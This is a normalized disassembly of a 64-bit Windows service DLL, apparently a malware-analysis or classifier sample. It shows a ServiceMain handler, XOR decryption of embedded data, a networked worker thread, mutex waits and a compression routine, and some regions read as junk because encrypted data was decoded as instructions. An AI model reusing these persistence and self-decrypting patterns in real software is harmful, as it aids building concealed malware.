lea r8 [ rsp + 0x40 ]
mov r9d esi
mov edx edi
call [ rw-data ]
xor dil dil
mov edx [ rbx + 0x850 ]
mov rcx [ rbx + 0x830 ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
or rcx 0xffffffffffffffff
lea rdi [ rbx + 0x10 ]
xor eax eax
mov [ rsp + 0x60 ] rdi
[ rdi ]
mov [ rsp + 0x78 ] r14d
not rcx
mov [ rsp + 0x7c ] r14d
mov [ rsp + 0x70 ] r13
sub rcx rsi
test r13 r13
lea rax [ r--data ]
lea r8 [ rbx + 0x10 ]
cmovne rax r13
lea rdx [ r--data ]
lea rcx [ rbp - 0x70 ]
mov r9 rax
mov r13 rax
call [ wsprintfA@IAT ]
or rcx 0xffffffffffffffff
lea rax [ rbp - 0x70 ]
lea rdi [ rbp - 0x70 ]
mov [ rsp + 0x60 ] rax
xor eax eax
and [ rsp + 0x78 ] eax
and [ rsp + 0x7c ] eax
[ rdi ]
not rcx
sub rcx rsi
and [ rsp + 0x70 ] rax
jmp r-xdata
mov rcx [ rbx + 0x860 ]
mov rcx [ rcx ]
call [ ReleaseMutex@IAT ]
mov al dil
mov rcx [ rbp + 0x790 ]
xor rcx rsp
call sub_180006220
add rsp 0x8a0
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx rbx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
mov rcx [ rbx + 0x820 ]
lea rdx [ rsp + 0x50 ]
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x20 ] rbx
call [ rw-data ]
test eax eax
jne r-xdata
mov eax r12d
add r12d esi
mov [ rsp + 0x6c ] ecx
mov [ rsp + 0x68 ] ecx
mov [ rsp + 0x50 ] 0x38
cmp eax 0x3
je r-xdata
xor ecx ecx
call [ SetLastError@IAT ]
mov rcx [ rbx + 0x820 ]
mov r9 rbx
xor r8d r8d
xor edx edx
mov dil sil
call [ rw-data ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
cmp eax 0x3e5
jne r-xdata
mov rcx [ rbx + 0x820 ]
and [ rsp + 0x44 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x4c ]
lea r8 [ rsp + 0x44 ]
mov edx 0x20000013
mov [ rsp + 0x4c ] 0x4
call [ rw-data ]
mov r11d [ rsp + 0x44 ]
sub r11d 0x191
je r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
cmp eax 0x3e5
jne r-xdata
mov edx [ rbx + 0x850 ]
mov rcx [ rbx + 0x838 ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
or rcx 0xffffffffffffffff
xor eax eax
lea r8 [ rbx + 0xf70 ]
mov rdi r8
lea edx [ rax + 0x1c ]
[ rdi ]
not rcx
sub rcx rsi
lea r9d [ rsi + rcx ]
mov rcx [ rbx + 0x820 ]
call [ rw-data ]
mov edx 0x1d
cmp r11d 0x6
jne r-xdata
xor dil dil
mov edx [ rbx + 0x850 ]
mov rcx [ rbx + 0x838 ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
cmp [ rbx + 0x840 ] 0x0
jne r-xdata
cmp [ rbx ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
test dil dil
jne r-xdata
or rcx 0xffffffffffffffff
xor eax eax
lea r8 [ rbx + 0xf70 ]
mov rdi r8
lea edx [ rax + 0x2b ]
[ rdi ]
not rcx
sub rcx rsi
lea r9d [ rsi + rcx ]
mov rcx [ rbx + 0x820 ]
call [ rw-data ]
mov edx 0x2c
jmp r-xdata
jmp r-xdata
or rcx 0xffffffffffffffff
lea r8 [ rbx + 0x1070 ]
xor eax eax
mov rdi r8
[ rdi ]
not rcx
sub rcx rsi
lea r9d [ rsi + rcx ]
mov rcx [ rbx + 0x820 ]
call [ rw-data ]
jmp r-xdata
sub_180003ad0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
lea rbp [ rsp - 0x790 ]
sub rsp 0x890
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x780 ] rax
mov rdi [ rcx + 0x860 ]
mov r12d r9d
mov r14 r8
mov r13 rdx
mov rbx rcx
mov rcx [ rdi ]
mov edx 0x12c
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
xor edx edx
lea esi [ rdx + 0x1 ]
cmp [ rbx ] sil
jne r-xdata
cmp [ rbx ] dl
jne r-xdata
lea rdx [ rbx + 0x841 ]
jmp r-xdata
cmp [ rbx + 0x1172 ] 0x0
mov [ rsp + 0x38 ] rbx
mov ecx 0x84080102
mov eax 0x84880102
lea r9 [ r--data ]
mov r8 r13
cmovne ecx eax
lea rax [ rbx + 0xc70 ]
mov [ rbx + 0x84a ] sil
mov [ rsp + 0x30 ] ecx
mov rcx [ rbx + 0x818 ]
and [ rsp + 0x28 ] 0x0
mov [ rsp + 0x20 ] rax
call [ rw-data ]
mov r13d 0x3e5
mov [ rbx + 0x820 ] rax
test rax rax
jne r-xdata
lea rdx [ rbx + 0x846 ]
cmp [ rbx + 0x1172 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
cmp eax r13d
jne r-xdata
mov edi 0x38
lea rcx [ rsp + 0x48 ]
xor edx edx
mov r8d edi
call sub_180008e40
cmp [ rbx ] 0x0
jne r-xdata
mov rcx [ rbx + 0x820 ]
mov r13d 0x4
lea r9 [ rsp + 0x44 ]
lea edi [ r13 + 0x1b ]
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x44 ] r13d
mov edx edi
call [ rw-data ]
mov rcx [ rbx + 0x820 ]
or [ rsp + 0x40 ] 0x3380
lea r8 [ rsp + 0x40 ]
mov r9d r13d
mov edx edi
call [ rw-data ]
mov r13d 0x3e5
mov rcx rbx
xor sil sil
call sub_1800031c4
mov rcx rbx
call sub_18000324c
mov edx [ rbx + 0x850 ]
mov rcx [ rbx + 0x830 ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
je r-xdata
or rcx 0xffffffffffffffff
mov [ rsp + 0x48 ] edi
lea rdi [ rbx + 0x10 ]
xor eax eax
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x70 ] r12d
[ rdi ]
mov [ rsp + 0x74 ] r12d
mov [ rsp + 0x68 ] r14
not rcx
sub rcx rsi
lea r9 [ r--data ]
test r14 r14
lea r8 [ rbx + 0x10 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x80 ]
cmovne r9 r14
call [ wsprintfA@IAT ]
or rcx 0xffffffffffffffff
lea rax [ rbp - 0x80 ]
mov [ rsp + 0x48 ] edi
lea rdi [ rbp - 0x80 ]
mov [ rsp + 0x58 ] rax
xor eax eax
and [ rsp + 0x70 ] eax
and [ rsp + 0x74 ] eax
[ rdi ]
not rcx
sub rcx rsi
and [ rsp + 0x68 ] rax
jmp r-xdata
mov rcx [ rbx + 0x820 ]
mov r9 rbx
xor r8d r8d
xor edx edx
call [ rw-data ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
cmp eax r13d
jne r-xdata
mov [ rsp + 0x64 ] ecx
mov [ rsp + 0x60 ] ecx
mov rcx [ rbx + 0x820 ]
lea rdx [ rsp + 0x48 ]
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x20 ] rbx
call [ rw-data ]
test eax eax
jne r-xdata
mov rcx [ rbx + 0x860 ]
mov rcx [ rcx ]
call [ ReleaseMutex@IAT ]
mov al sil
mov rcx [ rbp + 0x780 ]
xor rcx rsp
call sub_180006220
add rsp 0x890
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
cmp eax r13d
jne r-xdata
mov edx [ rbx + 0x850 ]
mov rcx [ rbx + 0x838 ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov edx [ rbx + 0x850 ]
mov rcx [ rbx + 0x838 ]
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
cmp [ rbx + 0x840 ] 0x0
jne r-xdata
call [ GetLastError@IAT ]
mov [ rbx + 0x858 ] eax
jmp r-xdata
sub_180003db4
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x58
xor ebx ebx
lea r8 [ rcx + 0xe70 ]
mov rsi rcx
lea edx [ rbx + 0x3 ]
add rcx 0xa70
xor r9d r9d
mov r13d ebx
mov [ rsp + 0x20 ] ebx
call [ rw-data ]
mov r14 rax
test rax rax
jne r-xdata
mov edi 0x4
lea r8 [ rbp + 0x50 ]
mov rcx rax
lea edx [ rdi - 0x2 ]
mov r9d edi
mov [ rbp + 0x50 ] 0xea60
mov [ rbp + 0x58 ] 0x1
mov [ rbp + 0x60 ] 0x1f4
call [ rw-data ]
lea r8 [ rbp + 0x58 ]
lea edx [ rdi - 0x1 ]
mov r9d edi
mov rcx r14
call [ rw-data ]
lea r8 [ rbp + 0x60 ]
mov r9d edi
mov edx edi
mov rcx r14
call [ rw-data ]
lea r8 [ rsi + 0x84c ]
lea edx [ rdi + 0x2 ]
mov r9d edi
mov rcx r14
call [ rw-data ]
movzx r8d [ rsi + 0xa6c ]
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] ebx
lea rdx [ rsi + 0x86c ]
xor r9d r9d
mov rcx r14
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x20 ] rbx
call [ rw-data ]
mov r15 rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
cmp [ rsi + 0x1172 ] bl
mov [ rsp + 0x38 ] rbx
mov ecx 0x80400100
mov eax 0x80c00100
lea r9 [ r--data ]
lea r8 [ rw-data ]
cmovne ecx eax
lea rax [ rsi + 0xc70 ]
lea rdx [ r--data ]
mov [ rsp + 0x30 ] ecx
mov rcx r15
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] rax
call [ rw-data ]
mov r12 rax
test rax rax
jne r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov al bl
add rsp 0x58
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
cmp [ rsi + 0x1172 ] bl
je r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
mov rcx r14
call [ rw-data ]
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx r12
mov [ rsp + 0x20 ] ebx
call [ rw-data ]
test eax eax
je r-xdata
mov rcx [ rsi + 0x820 ]
mov [ rbp - 0x18 ] edi
mov edi 0x1f
lea r9 [ rbp - 0x18 ]
lea r8 [ rbp + 0x48 ]
mov edx edi
call [ rw-data ]
mov rcx [ rsi + 0x820 ]
or [ rbp + 0x48 ] 0x3380
lea r9d [ rdi - 0x1b ]
lea r8 [ rbp + 0x48 ]
mov edx edi
call [ rw-data ]
mov edi 0x4
mov rcx r15
call [ rw-data ]
call [ GetLastError@IAT ]
mov eax r13d
inc r13d
mov [ rbp - 0x14 ] edi
cmp eax 0x3
ja r-xdata
mov rcx r12
call [ rw-data ]
lea r9 [ rbp - 0x14 ]
lea r8 [ rbp - 0x10 ]
mov edx 0x20000013
mov rcx r12
mov [ rsp + 0x20 ] rbx
call [ rw-data ]
mov edx [ rbp - 0x10 ]
sub edx 0x191
je r-xdata
or rcx 0xffffffffffffffff
xor eax eax
lea r8 [ rsi + 0xf70 ]
mov rdi r8
lea edx [ rax + 0x1c ]
[ rdi ]
not rcx
mov r9d ecx
mov rcx r12
call [ rw-data ]
mov edx 0x1d
cmp edx 0x6
jne r-xdata
mov edi 0x4
jmp r-xdata
mov bl 0x1
jmp r-xdata
or rcx 0xffffffffffffffff
xor eax eax
lea r8 [ rsi + 0xf70 ]
mov rdi r8
lea edx [ rax + 0x2b ]
[ rdi ]
not rcx
mov r9d ecx
mov rcx r12
call [ rw-data ]
mov edx 0x2c
jmp r-xdata
or rcx 0xffffffffffffffff
lea r8 [ rsi + 0x1070 ]
xor eax eax
mov rdi r8
[ rdi ]
not rcx
mov r9d ecx
mov rcx r12
call [ rw-data ]
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx r12
mov [ rsp + 0x20 ] ebx
call [ rw-data ]
test eax eax
je r-xdata
sub_180004084
push rbx
sub rsp 0x20
mov rbx rcx
cmp edx 0x1
jne r-xdata
mov eax 0x1
add rsp 0x20
pop rbx
retn
mov ecx 0x8007
call [ SetErrorMode@IAT ]
xor eax eax
mov [ rw-data ] rbx
mov [ rw-data ] eax
mov edx eax
lea rcx [ __dos_header ]
xor [ rdx + rcx + 0x1f730 ] 0xb5
inc rdx
cmp rdx 0x843
jl r-xdata
xor [ rax + rcx + 0x237b0 ] 0xeb
inc rax
cmp rax 0x43e
jl r-xdata
call [ GetTickCount@IAT ]
mov ecx eax
call sub_180006248
xor ecx ecx
call [ SetLastError@IAT ]
mov rcx rbx
call [ DisableThreadLibraryCalls@IAT ]
lea rdx [ rw-data ]
mov r8d 0x104
mov rcx rbx
mov [ rw-data ] rbx
call [ GetModuleFileNameA@IAT ]
lea rdx [ rw-data ]
mov r8d 0x104
xor ecx ecx
call [ GetModuleFileNameA@IAT ]
lea rcx [ rw-data ]
call sub_180006728
sub_180004148
mov rax rsp
push rdi
sub rsp 0x200
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1f0 ] rax
mov ecx 0x202
lea rdx [ rsp + 0x50 ]
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
mov ecx 0x8
call sub_180006294
mov rbx rax
test rax rax
je r-xdata
call [ WSAGetLastError@IAT ]
mov rbx [ rsp + 0x30 ]
mov rdi [ rsp + 0x28 ]
jmp r-xdata
xor ebx ebx
xor eax eax
mov [ rbx ] rax
jmp r-xdata
lea rcx [ rsp + 0x20 ]
call sub_1800014d4
nop
test rbx rbx
je r-xdata
xor edi edi
mov rdx rbx
mov rcx rax
call sub_180001ae4
mov rdi rax
jmp r-xdata
mov [ rsp + 0x30 ] rbx
mov ecx 0x70
call sub_180006294
mov [ rsp + 0x38 ] rax
test rax rax
je r-xdata
test rdi rdi
je r-xdata
mov rcx rbx
call j_sub_180006da4#2
mov [ rsp + 0x28 ] rdi
xor eax eax
mov rcx [ rsp + 0x1f0 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0x210 ]
add rsp 0x200
pop rdi
retn
mov rcx rdi
call sub_180001344
ServiceMain
sub rsp 0x48
mov r8d [ rw-data ]
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x38 ] 0x0
lea rdx [ rw-data ]
lea rcx [ rsp + 0x30 ]
mov r9b 0x1
call sub_18000530c
cmp [ rsp + 0x3c ] 0x0
je r-xdata
lea rcx [ rsp + 0x30 ]
call sub_1800053b8
lea rdx [ sub_1800043f8 ]
mov rcx rax
call [ RegisterServiceCtrlHandlerA@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
mov ecx [ rsp + 0x38 ]
test ecx ecx
je r-xdata
mov rcx [ rsp + 0x30 ]
test rcx rcx
je r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov edx 0xbb8
mov ecx 0x2
mov [ rw-data ] 0x30
mov [ rw-data ] 0x3
call sub_180004384
xor r9d r9d
xor r8d r8d
xor ecx ecx
lea edx [ r9 + 0x1 ]
call [ CreateEventW@IAT ]
xor edx edx
mov [ rw-data ] rax
test rax rax
je r-xdata
mov [ rsp + 0x3c ] 0x0
mov rax [ rsp + 0x30 ]
mov edx ecx
add rsp 0x48
retn
call j_sub_180006da4
mov ecx 0x1
call sub_180004384
lea ecx [ rdx + 0x4 ]
call sub_180004384
cmp [ rw-data ] 0x0
jne r-xdata
xor [ rax ] 0x90
inc rax
dec rdx
jne r-xdata
mov rcx [ rw-data ]
mov edx 0x1388
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r8 [ sub_180004148 ]
xor r9d r9d
xor edx edx
xor ecx ecx
call [ CreateThread@IAT ]
mov [ rw-data ] rax
xor edx edx
mov rcx [ rw-data ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
sub_180004384
xor eax eax
mov [ rw-data ] 0x10
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] rax
cmp ecx 0x2
jne r-xdata
mov [ rw-data ] 0x1
cmp ecx 0x4
je r-xdata
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] eax
cmp ecx 0x1
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
inc eax
mov [ rw-data ] eax
jmp r-xdata
mov rcx [ rw-data ]
lea rdx [ rw-data ]
jmp [ SetServiceStatus@IAT ]
sub_1800043f8
sub rsp 0x28
dec ecx
je r-xdata
xor edx edx
lea ecx [ rdx + 0x3 ]
call sub_180004384
mov rcx [ rw-data ]
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
xor edx edx
call sub_180004384
cmp ecx 0x4
jne r-xdata
add rsp 0x28
retn
mov [ rw-data ] 0x1
add rsp 0x28
retn
sub_180004440
push rbp
push r13
push r14
lea rbp [ rsp - 0x28f0 ]
mov eax 0x29f0
call sub_18000a210
sub rsp rax
mov [ rbp - 0x40 ] 0xfffffffffffffffe
mov [ rsp + 0x2a10 ] rbx
mov [ rsp + 0x2a18 ] rsi
mov [ rsp + 0x2a20 ] rdi
mov [ rsp + 0x2a28 ] r12
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x28e0 ] rax
mov ecx 0x6
call sub_1800061e1
xor r15d r8d
mov r14 [ rsi + 0x78 ]
mov [ rdi - 0x50 ] r14
mov spl r8b
mov r14 [ rbp - 0x7e ]
mov r14d [ rbp - 0x76 ]
mov r11b 0x1
mov r8d [ rdi ]
and eax 0x480201fa
sub_180004669
ror [ rdx + 0x2b ] cl
ror [ rdx + 0x20e880a ] cl
inc rdx
test bl cl
jne r-xdata
mov [ rsi ] cl
add cl [ rdx - 0x1 ]
retn 0xcb84
xor eax edx
test rcx rcx
add [ rcx - 0x73 ] ecx
cli
hlt
sub_1800048ec
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
mov ecx 0x4
call sub_1800061e1
mov r8d [ rdi ]
shl ch cl
add [ rdx ] eax
test [ rsi + 0x20 ] rsp
add al [ rbx + 0x2a2466 ]
mov r12d 0x20003
lea rdx [ rdi ]
out dx eax
hlt
sub_180004a24
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x8 ] rcx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x28
lea r15 [ rcx + rdx ]
mov r11 rcx
mov rdi r8
mov r14 rcx
lea rsi [ rcx + 0x4 ]
mov ebx 0x1
lea r13 [ r15 - 0xd ]
lea r12 [ rw-data ]
mov [ r12 + rcx * 8 ] rsi
mov rsi r9
cmp r9 r13
jb r-xdata
mov rbp rsi
sub rbp r12
lea rax [ rbp - 0x1 ]
cmp rax 0xbffe
ja r-xdata
movzx r8d [ rsi + 0x2 ]
lea r10 [ rsi + 0x3 ]
lea r9 [ rsi + 0x1 ]
movzx eax [ r9 ]
movzx edx [ r10 ]
mov [ rsp + 0x78 ] r10
mov ecx edx
shl rcx 0x6
xor rcx r8
shl rcx 0x5
xor rcx rax
movzx eax [ rsi ]
shl rcx 0x5
xor rcx rax
imul rcx rcx 0x21
shr rcx 0x5
and ecx 0x3fff
mov r12 [ r12 + rcx * 8 ]
cmp r12 r11
jb r-xdata
mov rax [ rsp + 0x88 ]
sub rdi [ rsp + 0x80 ]
sub r15 r14
mov [ rax ] rdi
mov rax r15
add rsp 0x28
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
cmp rbp 0x800
jbe r-xdata
movzx eax [ rsi ]
cmp [ r12 ] ax
jne r-xdata
cmp [ r12 + 0x3 ] dl
je r-xdata
cmp [ r12 + 0x2 ] r8b
jne r-xdata
and ecx 0x7ff
lea r12 [ rw-data ]
xor rcx 0x201f
mov r12 [ r12 + rcx * 8 ]
cmp r12 r11
jb r-xdata
lea rax [ rw-data ]
mov [ rax + rcx * 8 ] rsi
sub rsi r14
je r-xdata
mov rbp rsi
sub rbp r12
lea rax [ rbp - 0x1 ]
cmp rax 0xbffe
ja r-xdata
mov al [ r10 ]
lea rsi [ rbx + r10 ]
cmp [ r12 + 0x3 ] al
jne r-xdata
cmp rsi 0x3
ja r-xdata
cmp rbp 0x800
jbe r-xdata
sub rsi rbx
mov rcx rsi
sub rcx r14
cmp rbp 0x800
ja r-xdata
mov al [ rsi ]
add rsi rbx
cmp [ r12 + 0x4 ] al
jne r-xdata
cmp rsi 0x12
ja r-xdata
or [ rdi - 0x2 ] sil
jmp r-xdata
cmp [ r12 + 0x3 ] dl
jne r-xdata
mov edx 0x4000
sub cl 0x2
cmp rbp rdx
ja r-xdata
sub cl bl
sub rbp rbx
shl cl 0x3
mov al bpl
and al 0x7
or cl al
shl cl 0x2
shr rbp 0x3
mov [ rdi ] cl
jmp r-xdata
mov al [ rsi ]
add rsi rbx
cmp [ r12 + 0x5 ] al
jne r-xdata
lea r13 [ rsi - 0x12 ]
mov [ rdi ] 0x0
add rdi rbx
cmp r13 0xff
jbe r-xdata
lea eax [ rsi - 0x3 ]
mov [ rdi ] al
jmp r-xdata
mov al [ r14 ]
add r14 rbx
mov [ rdi ] al
add rdi rbx
sub rsi rbx
jne r-xdata
sub rbp rdx
mov rax rbp
shr rax 0xb
and al 0x8
or al cl
sub rbp rbx
or cl 0x20
mov [ rdi ] cl
jmp r-xdata
add rdi rbx
mov r14 rsi
mov [ rdi ] bpl
add rdi rbx
cmp rsi r13
jae r-xdata
mov al [ rsi ]
add rsi rbx
cmp [ r12 + 0x6 ] al
jne r-xdata
mov [ rdi ] r13b
lea r13 [ r15 - 0xd ]
lea rcx [ r13 - 0x100 ]
mov rax 0x8080808080808081
mul rcx
mov rcx rdi
mov rbx rdx
xor edx edx
shr rbx 0x7
inc rbx
mov r8 rbx
call sub_180008e40
mov r10 [ rsp + 0x78 ]
add rdi rbx
imul rbx rbx 0xffffffffffffff01
add r13 rbx
mov ebx 0x1
add rdi rbx
mov r11 [ rsp + 0x70 ]
jmp r-xdata
mov al bpl
add rdi rbx
shl al 0x2
shr rbp 0x6
mov [ rdi ] al
mov al [ rsi ]
add rsi rbx
cmp [ r12 + 0x7 ] al
jne r-xdata
lea r12 [ rw-data ]
mov al [ rsi ]
add rsi rbx
cmp [ r12 + 0x8 ] al
jne r-xdata
add r12 0x9
jmp r-xdata
cmp rsi r15
jb r-xdata
mov al [ rsi ]
cmp [ r12 ] al
jne r-xdata
mov r12 rsi
mov edx 0x4000
sub r12 r14
cmp rbp rdx
ja r-xdata
add r12 rbx
add rsi rbx
sub rbp rdx
mov rax rbp
shr rax 0xb
and al 0x8
cmp r12 0x9
ja r-xdata
sub rbp rbx
cmp r12 0x21
ja r-xdata
sub r12 0x9
or al 0x10
mov [ rdi ] al
sub r12b 0x2
or al r12b
jmp r-xdata
sub r12 0x21
mov [ rdi ] 0x20
jmp r-xdata
sub r12b 0x2
or r12b 0x20
mov [ rdi ] r12b
jmp r-xdata
lea rcx [ r12 - 0x100 ]
mov rax 0x8080808080808081
mul rcx
mov rcx rdi
mov rbx rdx
xor edx edx
shr rbx 0x7
inc rbx
mov r8 rbx
call sub_180008e40
add rdi rbx
imul rbx rbx 0xffffffffffffff01
add r12 rbx
mov ebx 0x1
jmp r-xdata
or al 0x10
mov [ rdi ] al
add rdi rbx
cmp r12 0xff
jbe r-xdata
sub_180004dbc
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 r9
mov r12 r8
mov rbx rdx
mov rbp rcx
mov rdi r8
cmp rdx 0xd
ja r-xdata
call sub_180004a24
mov rcx [ r14 ]
lea rdi [ r12 + rcx ]
mov rsi rax
mov rsi rdx
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov [ rdi ] 0x11
add rdi 0x2
mov [ rdi ] 0x0
sub rdi r12
inc rdi
xor eax eax
mov [ r14 ] rdi
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
sub rbp rsi
add rbp rbx
cmp rdi r12
jne r-xdata
test rsi rsi
je r-xdata
cmp rsi 0x3
ja r-xdata
cmp rsi 0xee
ja r-xdata
cmp rsi 0x12
ja r-xdata
or [ rdi - 0x2 ] sil
jmp r-xdata
lea eax [ rsi + 0x11 ]
lea r13 [ rsi - 0x12 ]
mov [ rdi ] 0x0
inc rdi
cmp r13 0xff
jbe r-xdata
lea eax [ rsi - 0x3 ]
jmp r-xdata
mov al [ rbp ]
inc rbp
mov [ rdi ] al
inc rdi
dec rsi
jne r-xdata
inc rdi
mov [ rdi ] r13b
lea rcx [ r13 - 0x100 ]
mov rax 0x8080808080808081
mul rcx
mov rcx rdi
mov rbx rdx
xor edx edx
shr rbx 0x7
inc rbx
mov r8 rbx
call sub_180008e40
add rdi rbx
imul rbx rbx 0xffffffffffffff01
add r13 rbx
mov [ rdi ] al
jmp r-xdata
sub_180004ed4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
xor r12d r12d
cmp [ rcx ] 0x11
mov rbx r9
mov rdi r8
mov r10 rcx
lea r9 [ rcx + rdx ]
mov [ rbx ] r12
lea esi [ r12 + 0x1 ]
mov r11 r8
mov r13d 0xff
jbe r-xdata
movzx r8d [ r10 ]
add r10 rsi
cmp r8 0x10
jae r-xdata
movzx eax [ rcx ]
sub eax 0x11
inc r10
movsxd rcx eax
cmp rcx 0x4
jb r-xdata
cmp r8 0x40
jb r-xdata
test r8 r8
jne r-xdata
mov al [ r10 ]
add r10 rsi
mov [ r11 ] al
add r11 rsi
cmp rcx rsi
jbe r-xdata
mov al [ r10 ]
add r10 rsi
mov [ r11 ] al
add r11 rsi
sub rcx rsi
jne r-xdata
cmp r8 0x20
jb r-xdata
movzx eax [ r10 ]
mov rdx r11
add r10 rsi
shl eax 0x3
movsxd rcx eax
mov rax r8
shr r8 0x5
shr rax 0x2
sub rdx rcx
and eax 0x7
sub rdx rax
sub rdx rsi
sub r8 rsi
mov eax [ r10 ]
add r10 0x4
mov [ r11 ] eax
add r11 0x4
sub r8 rsi
je r-xdata
jmp r-xdata
movzx r8d [ r10 ]
add r10 rsi
jmp r-xdata
mov al [ r10 ]
add r10 rsi
mov [ r11 ] al
add r11 rsi
cmp rcx 0x2
jbe r-xdata
jmp r-xdata
mov rdx r11
cmp r8 0x10
jb r-xdata
and r8d 0x1f
jne r-xdata
mov al [ rdx ]
add rdx rsi
mov [ r11 ] al
add r11 rsi
sub r8 rsi
jne r-xdata
jmp r-xdata
movzx r8d [ r10 ]
add r10 rsi
cmp r8 0x10
jae r-xdata
cmp r8 0x4
jb r-xdata
cmp [ r10 ] r12b
je r-xdata
mov al [ r10 ]
mov [ r11 ] al
add r11 rsi
add r10 rsi
movzx eax [ r10 ]
shr r8 0x2
shl eax 0x2
movsxd rcx eax
sub rdx rcx
sub rdx r8
sub rdx rsi
mov al [ rdx ]
mov [ r11 ] al
mov al [ rdx + 0x1 ]
mov rax r8
and eax 0x8
shl rax 0xb
sub rdx rax
and r8d 0x7
jne r-xdata
movzx eax [ r10 ]
mov rdx r11
shr rax 0x2
sub rdx rax
sub rdx rsi
add r10 0x2
jmp r-xdata
jmp r-xdata
movzx ecx [ r10 - 0x2 ]
and ecx 0x3
je r-xdata
movzx eax [ r10 ]
mov rdx r11
shr r8 0x2
shl eax 0x2
movsxd rcx eax
sub rdx rcx
sub rdx r8
mov al [ rdx - 0x801 ]
mov [ r11 ] al
mov al [ rdx + rsi - 0x801 ]
add r11 rsi
mov [ r11 ] al
mov al [ rdx + rsi - 0x800 ]
jmp r-xdata
mov al [ r10 ]
add r10 rsi
mov [ r11 ] al
add r11 rsi
sub r8 rsi
jne r-xdata
mov eax [ r10 ]
sub r8 0x4
add r10 0x4
mov [ r11 ] eax
add r11 0x4
cmp r8 0x4
jae r-xdata
add r8 r13
add r10 rsi
movzx eax [ r10 ]
add eax 0xf
cdqe
add r8 rax
add r10 rsi
movzx eax [ r10 ]
add r10 0x2
shr rax 0x2
sub rdx rax
cmp rdx r11
je r-xdata
jmp r-xdata
cmp r8 0x6
jb r-xdata
cmp [ r10 ] r12b
je r-xdata
add r11 rsi
add r10 rsi
mov [ r11 ] al
add r11 rsi
test r8 r8
je r-xdata
mov rsi [ rsp + 0x18 ]
sub r11 rdi
mov rdi [ rsp + 0x20 ]
cmp r10 r9
mov [ rbx ] r11
mov rbx [ rsp + 0x10 ]
sbb eax eax
and eax 0xfffffffc
add eax 0xfffffffc
cmp r10 r9
cmove eax r12d
mov r12 [ rsp + 0x28 ]
pop r13
retn
sub rdx 0x4000
cmp [ r10 ] r12b
je r-xdata
mov al [ rdx ]
add rdx rsi
mov [ r11 ] al
mov al [ rdx ]
add r11 rsi
mov [ r11 ] al
add r11 rsi
add rdx rsi
mov rax r11
sub rax rdx
cmp rax 0x4
